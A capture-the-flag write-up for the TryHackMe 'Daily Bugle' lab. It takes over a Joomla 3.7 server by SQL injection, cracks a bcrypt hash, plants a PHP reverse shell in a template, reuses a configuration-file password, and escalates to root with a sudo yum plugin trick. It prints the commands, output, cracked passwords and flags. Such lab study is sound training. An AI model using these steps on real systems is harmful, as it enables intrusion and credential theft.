
# Daily Bugle
https://tryhackme.com/room/dailybugle  

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.  

## Questions

> Access the web server, who robbed the bank?  

> What is the Joomla version?  

*Instead of using SQLMap, why not use a python script!*  

> What is Jonah's cracked password?  

> What is the user flag?  

> What is the root flag?  

## 1. Enumerate Ports
```bash
─$ nmap -A -sC 10.201.31.137     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 10:14 PDT
Nmap scan report for 10.201.31.137
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   207.98 ms 10.23.0.1
2   ... 3
4   278.89 ms 10.201.31.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.31 seconds
```

> port 22/tcp is ssh  

> port 80/tcp is Apache http server  

> port 3306/tcp is a MariaDB server with latest possible version 10.3.23

From this we can also see that the Daily Bugle is using Joomla cms. There
are a lot of directories disallowed by the robots.txt so it could be a good
idea to fuzz them. We could also note that the site uses php.

## 2. Brute Force URIs

Instead of using __ffuf__ to fuzz each directory, I'm going to try __gobuster__.  

```bash
└─$ gobuster dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt --url 10.201.31.137 --threads 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.31.137
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/media                (Status: 301) [Size: 235] [--> http://10.201.31.137/media/]
/templates            (Status: 301) [Size: 239] [--> http://10.201.31.137/templates/]
/modules              (Status: 301) [Size: 237] [--> http://10.201.31.137/modules/]
/images               (Status: 301) [Size: 236] [--> http://10.201.31.137/images/]
/bin                  (Status: 301) [Size: 233] [--> http://10.201.31.137/bin/]
/plugins              (Status: 301) [Size: 237] [--> http://10.201.31.137/plugins/]
/includes             (Status: 301) [Size: 238] [--> http://10.201.31.137/includes/]
/language             (Status: 301) [Size: 238] [--> http://10.201.31.137/language/]
/components           (Status: 301) [Size: 240] [--> http://10.201.31.137/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.201.31.137/cache/]
/libraries            (Status: 301) [Size: 239] [--> http://10.201.31.137/libraries/]
/tmp                  (Status: 301) [Size: 233] [--> http://10.201.31.137/tmp/]
/layouts              (Status: 301) [Size: 237] [--> http://10.201.31.137/layouts/]
/administrator        (Status: 301) [Size: 243] [--> http://10.201.31.137/administrator/]
/cli                  (Status: 301) [Size: 233] [--> http://10.201.31.137/cli/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

This did not reveal anything interesting that the __nmap__ scan did not already.

## 3. Survey the Webpage

The homepage is of course the daily bugle. There are two session cookies, some
jquery and joomla stuff. I didn't find any interesting comments in the html. On
the actual page there is a single post by __Super User__. Not bery many links
and a login with username and password recovery. Maybe we could somehow get the
verification code.  

Snooping the __robots.txt__, most sites return empty pages but 
`/joomla/administrator/`, `/installation/`, and `/logs/`, return "Not Found".
The URI `/administrator/` is the Joomla admin login page.

## 4. Who Robbed the Bank?

__Spiderman__  

## 5. Find the Joomla Version

Tryhackme wants us to first find the Joomla version and hints that it might be
vulnerable. I can think of multiple possible ways to do this: try fuzzing for
more informative files, check the Joomla copyright in the browser's debugger,
find `/includes/joomla/version.php`, or just login to the admin page XD.  

The Joomla Copyright is 2005-2017 so that can help to narrow the version number.
The URI: `/includes/joomla/version.php` does not exist on this site. We are
probably looking at Joomla 3.7 or 3.8 based on the
[date](https://www.tldevtech.com/timeline-of-joomla-releases/).  

Keeping those versions in mind, I'm going to use __ffuf__ to fuzz each directory
and see if there's anything possibly more informative.  

```bash
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -w /tmp/dirs.txt:DIRS -u http://10.201.31.137/DIRS/FUZZ -e .php,.md,.txt -mc all -fc 403,404 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.31.137/DIRS/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Wordlist         : DIRS: /tmp/dirs.txt
 :: Extensions       : .php .md .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 403,404
________________________________________________

[Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 224ms]
    * DIRS: /
    * FUZZ: LICENSE.txt

[Status: 200, Size: 4494, Words: 481, Lines: 73, Duration: 333ms]
    * DIRS: /
    * FUZZ: README.txt
```
> I picked a smaller wordlist this time

```bash
└─$ cat dirs.txt 
/
joomla/administrator
administrator
bin
cache 
cli
components
includes
installation
language 
layouts
libraries
logs
modules
plugins
tmp
```
> The dirs.txt file I used

```bash
└─$ wget http://10.201.31.137/README.txt
└─$ head -n 5 README.txt
1- What is this?
        * This is a Joomla! installation/upgrade package to version 3.x
        * Joomla! Official site: https://www.joomla.org
        * Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
        * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master
```
> Or just visit the README in the browser

The `README.txt` tells us that the Joomla version is __3.7__ which does in fact 
have an SQL injection
[vulnerability](https://github.com/stefanlucas/Exploit-Joomla):
[CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917).

## 6. Joomblah

This [python script](https://github.com/stefanlucas/Exploit-Joomla) 
written by HarryR performs these steps:
1. gets the Joomla login page
2. extracts CSRF token from the response
3. validates that we can do sqli by trying to add 127 and 128, and checking for a
   response of 255.
4. extracts table names
5. extracts users and sessions from each table

> You possibly need to modify line 46: `result += value` to 
> `result += value.decode('utf-8')`

```bash
└─$ python joomblah.py http://10.201.31.137
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

We get jonah's hashed password: `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. The `$2y$` means __bcrypt__.

## 7. Crack Jonah's Password

> I pumped my vm up on cpu cores and memory

```bash
└─$ hashcat -a0 -m3200 /tmp/crack.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-x86-64-QEMU Virtual CPU version 2.5+, 2916/5897 MB (1024 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Fri Aug 15 12:56:05 2025 (3 mins, 15 secs)
Time.Estimated...: Fri Aug 15 12:59:20 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      241 H/s (8.79ms) @ Accel:12 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 46944/14344385 (0.33%)
Rejected.........: 0/46944 (0.00%)
Restore.Point....: 46800/14344385 (0.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: thelma1 -> pink85

Started: Fri Aug 15 12:55:40 2025
Stopped: Fri Aug 15 12:59:22 2025
```

## 8. Create a Reverse Shell

Using Jonah's credentials we can login to the Joomla admin dashboard at
`/administrator`. We can then [modify the template to create a reverse shell](https://www.hackingarticles.in/joomla-reverse-shell/). Kali Linux has a php reverse webshell that we can use.  

```bash
└─$ ls -l /usr/share/webshells/php/php-reverse-shell.php 
-rwxr-xr-x 1 root root 5491 Nov 20  2021 /usr/share/webshells/php/php-reverse-shell.php
```

Replace everything in __index.php__ with the reverse webshell script and make
sure to modify these two lines:

```bash
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Save the file and setup a listener.

```bash
└─$ nc -lnvp 1234
listening on [any] 1234 ...
```

Then visit `http://MACHINE_IP/templates/beez3/index.php`. We now have a remote
shell.

```bash
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.23.155.175] from (UNKNOWN) [10.201.76.122] 43718
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:53:37 up 43 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.2$ 
```

## 9. Get into a user account

We cannot find the __user.txt__ just yet.

```bash
sh-4.2$ find / -name user.txt -exec cat {} \; -quit 2>/dev/null
# nothing
```

We also have no sudo permissions.

```bash
sh-4.2$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
```

So we probably want to login to jjameson or mysql accounts.

```bash
sh-4.2$ tail /etc/passwd   
tail /etc/passwd
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
```

But jjameson did not reuse `spiderman123` as his password this time.

```bash
sh-4.2$ su - jjameson
Password: spiderman123
su: Authentication failure
```

We could try looking for MariaDB configuration files to see if and passwords
are stored in plain text.

```bash
find -type d -iname MariaDB 2>/dev/null
./run/mariadb
./var/log/mariadb
sh-4.2$ ls -l ./run/mariadb ./var/log/mariadb
./run/mariadb:
total 4
-rw-rw---- 1 mysql mysql 5 Aug 15 17:10 mariadb.pid
ls: cannot open directory ./var/log/mariadb: Permission denied
```
> doesn't seem useful

Instead check out `/var/www/html`. There's a __configuration.php__.

```bash
sh-4.2$ ls
LICENSE.txt
README.txt
administrator
bin
cache
cli
components
configuration.php
htaccess.txt
images
includes
index.php
language
layouts
libraries
media
modules
plugins
robots.txt
templates
tmp
web.config.txt
```

Read __configuration.php__.

```bash
<?php
class JConfig {
        public $password = 'nv5uz9r3ZEDzVjNu';
}
```
> I removed everything but the password since it's all I care about.

```bash
$ su - jjameson
Password: nv5uz9r3ZEDzVjNu
id; pwd
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
/home/jjameson
```

## 10. user.txt

It is found in Jonah's home directory

```bash
cat user.txt
27a260fe3cba712cfdedb1c86d80442e
```

## 11. Escalate Privileges

```bash
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
> The room description mentions using __yum__ to escalate privileges.

Check [gtfobins](https://gtfobins.github.io/gtfobins/yum/).

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

We now have a root shell.

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

## 12. root.txt

```bash
find / -name root.txt -exec cat {} \; -quit
eec3d53292b1821868266858d7fa6f79
```

## Sources

1. https://www.kali.org/tools/gobuster/
2. https://www.tldevtech.com/timeline-of-joomla-releases/
3. https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py
4. https://www.kali.org/tools/webshells/
5. https://gtfobins.github.io/gtfobins/yum/
6. https://www.hackingarticles.in/joomla-reverse-shell/
